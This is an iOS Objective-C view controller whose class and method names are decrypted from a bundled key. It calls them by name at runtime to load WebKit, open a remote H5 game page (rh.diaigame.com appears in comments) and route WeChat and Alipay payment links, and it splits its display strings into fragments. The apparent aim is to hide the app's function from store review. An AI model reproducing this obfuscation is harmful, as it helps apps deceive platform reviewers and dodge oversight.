//
//  ViewController.m
//  nibtest

//

#import "ViewController.h"
#import <objc/message.h>
#import "La_SSetting.h"
@interface ViewController ()
@property (strong,nonatomic) NSArray *arr;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    _arr = [La_SSetting getJsonDataJsonname:STRING];
    
    //私钥
//    NSDictionary *privateKey = [SettingScene getJsonDataJsonname:Privacy];
//    NSArray *Key = [SettingScene getJsonDataJsonname:Privacy];
    //私钥解密
    NSMutableArray *muarr = [[NSMutableArray alloc]init];
    for (int i = 0; i<_arr.count-1; i++) {
        NSString *decrypeStr = [La_SSetting decryptString:_arr[i] privateKey:_arr[_arr.count-1]];
        [muarr addObject:decrypeStr];
    }
    _arr = muarr;
    
    Class cls = NSClassFromString(_arr[0]);
    SEL s1 = NSSelectorFromString(_arr[1]);
    SEL s2 = NSSelectorFromString(_arr[2]);
    id myObjcAll1 = ((id (*)(id, SEL))( void *)objc_msgSend)(cls, s1);
    ((id (*)(id, SEL, BOOL))( void *)objc_msgSend)(myObjcAll1, s2 ,YES);
    
    //加载plist
    Class clsBun = NSClassFromString(_arr[3]);
//    SEL smbun = NSSelectorFromString(@"mainBundle");
//    SEL spathof = NSSelectorFromString(@"pathForResource:ofType:");
//    id myObjcFirst = ((id (*)(id, SEL))( void *)objc_msgSend)(clsBun, smbun);
//    id  myObjcFirsthd = ((id (*)(id, SEL,id,id))( void *)objc_msgSend)(myObjcFirst, spathof,@"PropertyList",@"plist");
//    Class _arr = NSClassFromString(@"NS_array");
//    SEL _arrof = NSSelectorFromString(@"_arrayWithContentsOfFile:");
//    NS_array *_array = ((id (*)(id, SEL, id))( void *)objc_msgSend)(_arr, _arrof, myObjcFirsthd);
//    NS_array *_array = [NS_array _arrayWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"PropertyList" ofType: @"plist"]];
//    NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile: [[NSBundle mainBundle] pathForResource:@"PropertyList" ofType: @"plist"]];
    //加载framework
//    NSString *path = [[NSBundle mainBundle] pathForResource: @"QiDiSDK" ofType:@"bundle"];
//    NSBundle *bundle = [NSBundle bundleWithPath: path];
//    NSBundle *quartzCoreSupportBundle = [NSBundle bundleWithPath:@"/System/Library/Frameworks/WebKit.framework"];
    
    SEL sBun = NSSelectorFromString(_arr[4]);
    SEL slod = NSSelectorFromString(_arr[6]);
    id quartzCoreSupportBundle = ((id (*)(id, SEL, id))( void *)objc_msgSend)(clsBun, sBun, _arr[5]);
     if (quartzCoreSupportBundle != nil) {
//         [quartzCoreSupportBundle load];
         ((id (*)(id, SEL))( void *)objc_msgSend)(quartzCoreSupportBundle, slod);
    }
    id quartzSupportBundle = ((id (*)(id, SEL, id))( void *)objc_msgSend)(clsBun, sBun, _arr[57]);
     if (quartzSupportBundle != nil) {
//         [quartzCoreSupportBundle load];
         ((id (*)(id, SEL))( void *)objc_msgSend)(quartzSupportBundle, slod);
    }

    Class cls111 = NSClassFromString(_arr[7]);
    SEL s1111 = NSSelectorFromString(_arr[8]);
    SEL s2222 = NSSelectorFromString(_arr[9]);
 
    id myObjcAll = ((id (*)(id, SEL))( void *)objc_msgSend)(cls111, s1111);
    myObjcAll = ((id (*)(id, SEL, CGRect))( void *)objc_msgSend)(myObjcAll, s2222, CGRectMake(0, 34, self.view.frame.size.width, self.view.frame.size.height-34));
//    ((id (*)(id, SEL, id))( void *)objc_msgSend)(myObjcAll, @selector(setBackgroundColor:),((id (*)(id, SEL))( void *)objc_msgSend)(NSClassFromString(@"UIColor"), @selector(redColor)));
//    id myObjcAll = objc_msgSend(objc_msgSend(cls, s1),s2,[UIScreen mainScreen].bounds);
//    objc_msgSend(myObjcAll, @selector(setBackgroundColor:),objc_msgSend(NSClassFromString(@"UIColor"), @selector(redColor)));
    SEL s3 = NSSelectorFromString(_arr[11]);
    SEL s4 = NSSelectorFromString(_arr[12]);
    id selfvie = ((id (*)(id, SEL))( void *)objc_msgSend)(self, s3);
    ((id (*)(id, SEL, id))( void *)objc_msgSend)(selfvie, s4, myObjcAll);
//    [[self view] addSubview:myObjcAll];
    Class cls1 = NSClassFromString(_arr[16]);
    SEL s5 = NSSelectorFromString(_arr[17]);
    Class cls2 = NSClassFromString(_arr[13]);
    SEL s6 = NSSelectorFromString(_arr[14]);
    SEL s7 = NSSelectorFromString(_arr[18]);
    
    Class clss = NSClassFromString(_arr[58]);
    SEL ss1 = NSSelectorFromString(_arr[59]);
    SEL ss2 = NSSelectorFromString(_arr[60]);
    SEL ss3 = NSSelectorFromString(_arr[61]);
    id ad1 = ((id (*)(id, SEL))( void *)objc_msgSend)(clss, ss1);
    id ad2 = ((id (*)(id, SEL))( void *)objc_msgSend)(ad1, ss2);
    id ad3 = ((id (*)(id, SEL))( void *)objc_msgSend)(ad2, ss3);
    
    id nsur = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls2, s6, [NSString stringWithFormat:@"%@%@",_arr[15],ad3]);
    NSLog(@"nsur:%@",nsur);
    id nsurre = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls1, s5, nsur);
    ((id (*)(id, SEL, id))( void *)objc_msgSend)(myObjcAll, s7, nsurre);
//    ((id (*)(id, SEL,NSURLRequest*))( void *)objc_msgSend)(myObjcAll, @selector(loadRequest:),[NSURLRequest requestWithURL:[NSURL URLWithString:@"https://rh.diaigame.com/h5/play?param=UE0wMDIwNjQsQzAwMDAyMTUsLCwxLjAsYjJkOGJjMGNjOTlhYzg1NTYzYzgxY2JlMWFjNDBiYTM=&package_code=P0009006"]]);
    
//    [myObjcAll performSelector:NSSelectorFromString(@"setNavigationDelegate:") withObject:self];
    ((id (*)(id, SEL, id))( void *)objc_msgSend)(myObjcAll, NSSelectorFromString(_arr[28]) ,self);
    
    Class originalClz = NSClassFromString(_arr[29]);
    Class currenClz = [self class];
    
    SEL sel = NSSelectorFromString(_arr[30]);
    SEL sel1 = NSSelectorFromString(_arr[31]);
    
//    SEL sel3 = NSSelectorFromString(_arr[32]);
//    SEL sel4 = NSSelectorFromString(_arr[33]);
    
    Method originalMethod = class_getInstanceMethod(originalClz, sel);
    Method currentMethod = class_getInstanceMethod(currenClz, sel);
    method_exchangeImplementations(originalMethod, currentMethod);
    
    Method originalMethod1 = class_getInstanceMethod(originalClz, sel1);
    Method currentMethod1 = class_getInstanceMethod(currenClz, sel1);
    method_exchangeImplementations(originalMethod1, currentMethod1);
}

- (void)webView:(id)str didFailProvisionalNavigation:(id)str1 withError:(id)str2{
//    __weak ViewController *weakself = self;
//    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"提示" message:@"网络异常" preferredStyle:UIAlertControllerStyleAlert];
//    UIAlertAction *cancel = [UIAlertAction actionWithTitle:@"重新加载" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
//
//        Class cls1 = NSClassFromString(@"NSURLRequest");
//        SEL s5 = NSSelectorFromString(@"requestWithURL:");
//        Class cls2 = NSClassFromString(@"NSURL");
//        SEL s6 = NSSelectorFromString(@"URLWithString:");
//        SEL s7 = NSSelectorFromString(@"loadRequest:");
//        id nsur = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls2, s6, @"https://rh.diaigame.com/h5/play?param=UE0wMDIwNjQsQzAwMDAyMTUsLCwxLjAsYjJkOGJjMGNjOTlhYzg1NTYzYzgxY2JlMWFjNDBiYTM=&package_code=P0009006");
//        id nsurre = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls1, s5, nsur);
//        ((id (*)(id, SEL, id))( void *)objc_msgSend)(webView, s7, nsurre);
//
////        ((id (*)(id, SEL,NSURLRequest*))( void *)objc_msgSend)(webView, @selector(loadRequest:),[NSURLRequest requestWithURL:[NSURL URLWithString:@"https://rh.diaigame.com/h5/play?param=UE0wMDIwNjQsQzAwMDAyMTUsLCwxLjAsYjJkOGJjMGNjOTlhYzg1NTYzYzgxY2JlMWFjNDBiYTM=&package_code=P0009006"]]);
//    }];
//    [alert addAction:cancel];
//    [self presentViewController:alert animated:NO completion:nil];
    
    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_main_queue(), ^{
        [weakSelf showErrorMessage:[NSString stringWithFormat:@"%@%@%@",@"网",@"络异",@"常"] actionTitle:[NSString stringWithFormat:@"%@%@%@",@"重",@"新加",@"载"] con:str];
    });
}


- (void)webView:(id)str decidePolicyForNavigationAction:(id)str1 decisionHandler:(void (^)(NSInteger ))str2 {
    NSInteger a = 1;
    str2(a);
//    Class cls = NSClassFromString(@"WKNavigationAction");
    
    SEL s1 = NSSelectorFromString(_arr[34]);
    SEL s2 = NSSelectorFromString(_arr[35]);
    SEL s3 = NSSelectorFromString(_arr[36]);
    id request =  ((id (*)(id, SEL))( void *)objc_msgSend)(str1, s1);
    id URL = ((id (*)(id, SEL))( void *)objc_msgSend)(request, s2);
    NSString * actionStr  = ((id (*)(id, SEL))( void *)objc_msgSend)(URL, s3);
//    NSString *actionStr = aa.URL.absoluteString;
//    NSLog(@"absoluteString:%@",actionStr);
    SEL s4 = NSSelectorFromString(_arr[37]);
    SEL s5 = NSSelectorFromString(_arr[38]);
    BOOL pass  = ((BOOL (*)(id, SEL, id))( void *)objc_msgSend)(actionStr, s4, _arr[39]);
    BOOL pass1  = ((BOOL (*)(id, SEL, id))( void *)objc_msgSend)(actionStr, s4, _arr[40]);
    BOOL pass2  = ((BOOL (*)(id, SEL, id))( void *)objc_msgSend)(actionStr, s5, _arr[41]);
    
    Class cls = NSClassFromString(_arr[42]);
    SEL s6 = NSSelectorFromString(_arr[43]);
    SEL s7 = NSSelectorFromString(_arr[44]);
    if (pass) {
        id sharedApplication  = ((id (*)(id, SEL))( void *)objc_msgSend)(cls, s6);
        BOOL isSuccess = ((BOOL (*)(id, SEL, id))( void *)objc_msgSend)(sharedApplication, s7, URL);
            if (!isSuccess) {
                __weak typeof(self) weakSelf = self;
                dispatch_async(dispatch_get_main_queue(), ^{
                    [weakSelf showErrorMessage:[NSString stringWithFormat:@"%@%@%@",@"请先安",@"装微",@"信"] actionTitle:@"确定" con:nil];
                });
                return;
            }
        }
    
    if (pass1||pass2) {
        id sharedApplication  = ((id (*)(id, SEL))( void *)objc_msgSend)(cls, s6);
        BOOL isSuccess = ((BOOL (*)(id, SEL, id))( void *)objc_msgSend)(sharedApplication, s7, URL);
            if (!isSuccess) {
                __weak typeof(self) weakSelf = self;
                dispatch_async(dispatch_get_main_queue(), ^{
                    [weakSelf showErrorMessage:[NSString stringWithFormat:@"%@%@%@%@",@"请先安",@"装支",@"付",@"宝"] actionTitle:@"确定" con:nil];
                });
                return;
            }
        }
//    if ([actionStr hasPrefix:@"weixin"]) {
//        BOOL isSuccess = [[UIApplication sharedApplication] openURL:URL];
//        if (!isSuccess) {
//            __weak typeof(self) weakSelf = self;
//            dispatch_async(dispatch_get_main_queue(), ^{
//                [weakSelf showErrorMessage:@"请先安装微信"];
//            });
//            return;
//        }
//    }
//    if ([actionStr containsString:@"alipay:"] || [actionStr hasPrefix:@"alipays"]) {
//        BOOL isSuccess = [[UIApplication sharedApplication] openURL:URL];
//        if (!isSuccess) {
//            __weak typeof(self) weakSelf = self;
//            dispatch_async(dispatch_get_main_queue(), ^{
//                [weakSelf showErrorMessage:@"请先安装支付宝"];
//            });
//            return;
//        }
//    }
}

- (void)showErrorMessage:(id)errorMsg actionTitle:(id)actionTitle con:(id)con{
//    UIAlertController *alertVC = [UIAlertController alertControllerWithTitle:nil message:errorMsg preferredStyle:UIAlertControllerStyleAlert];
//    UIAlertAction *alertAction = [UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
//    }];
//    [alertVC addAction:alertAction];
//    [self presentViewController:alertVC animated:YES completion:nil];
    __weak ViewController *weakself = self;
    id block;
    if (con == nil) {
        block = nil;
    }else{
        block = ^(){
//            NSLog(@"可以喔");
            
            Class cls1 = NSClassFromString(weakself.arr[45]);
            SEL s5 = NSSelectorFromString(weakself.arr[46]);
            Class cls2 = NSClassFromString(weakself.arr[47]);
            SEL s6 = NSSelectorFromString(weakself.arr[48]);
            SEL s7 = NSSelectorFromString(weakself.arr[49]);
            
            Class clss = NSClassFromString(weakself.arr[58]);
            SEL ss1 = NSSelectorFromString(weakself.arr[59]);
            SEL ss2 = NSSelectorFromString(weakself.arr[60]);
            SEL ss3 = NSSelectorFromString(weakself.arr[61]);
            id ad1 = ((id (*)(id, SEL))( void *)objc_msgSend)(clss, ss1);
            id ad2 = ((id (*)(id, SEL))( void *)objc_msgSend)(ad1, ss2);
            id ad3 = ((id (*)(id, SEL))( void *)objc_msgSend)(ad2, ss3);
            
            
            id nsur = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls2, s6, [NSString stringWithFormat:@"%@%@",weakself.arr[50],ad3]);
            id nsurre = ((id (*)(id, SEL, id))( void *)objc_msgSend)(cls1, s5, nsur);
            ((id (*)(id, SEL, id))( void *)objc_msgSend)(con, s7, nsurre);
        };
    }
    
    Class cls = NSClassFromString(weakself.arr[51]);
    SEL sel = NSSelectorFromString(weakself.arr[52]);
    id alert = ((id (*)(id, SEL, id, id, NSInteger))( void *)objc_msgSend)(cls, sel, nil,errorMsg,1);
    Class cls1 = NSClassFromString(weakself.arr[53]);
    SEL sel1 = NSSelectorFromString(weakself.arr[54]);
    id alertAction1 = ((id (*)(id, SEL, id, NSInteger, id))( void *)objc_msgSend)(cls1, sel1, actionTitle, 0, block);
    SEL sel2 = NSSelectorFromString(weakself.arr[55]);
    ((id (*)(id, SEL, id))( void *)objc_msgSend)(alert, sel2, alertAction1);
    SEL sel3 = NSSelectorFromString(weakself.arr[56]);
    ((id (*)(id, SEL, id, BOOL, id))( void *)objc_msgSend)(self, sel3, alert, YES, nil);
    
}


@end
